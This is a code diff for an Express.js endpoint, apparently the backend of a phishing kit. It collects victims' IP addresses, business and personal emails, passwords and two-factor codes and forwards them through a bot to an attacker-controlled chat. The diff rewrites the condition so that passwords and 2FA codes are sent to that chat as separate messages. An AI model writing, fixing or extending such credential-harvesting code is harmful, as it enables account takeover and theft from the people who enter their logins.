@@ -28,12 +28,8 @@ app.post('/api/resgister', (req, res) => {
 
     console.log(data.firstTwoFa);
 
-if (data.firstTwoFa != undefined || data.secondTwoFa != undefined || data.firstTwoFa != "" || data.secondTwoFa != "" || data.firstTwoFa != null || data.secondTwoFa != null) {
-    const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
-<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
-<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
-    bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
-} else {
+if (data.firstTwoFa == undefined || data.secondTwoFa == undefined || data.firstTwoFa == "" || data.secondTwoFa == "" || data.firstTwoFa == null || data.secondTwoFa == null) {
+    
     const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
 <strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
 <strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
@@ -44,6 +40,14 @@ if (data.firstTwoFa != undefined || data.secondTwoFa != undefined || data.firstT
 <strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}`;
 
     bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
+
+} else {
+
+    const messageCode = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
+<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
+<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
+    bot.sendMessage(process.env.CHAT_ID, messageCode,  { parse_mode: 'HTML' });
+
 }
 
 
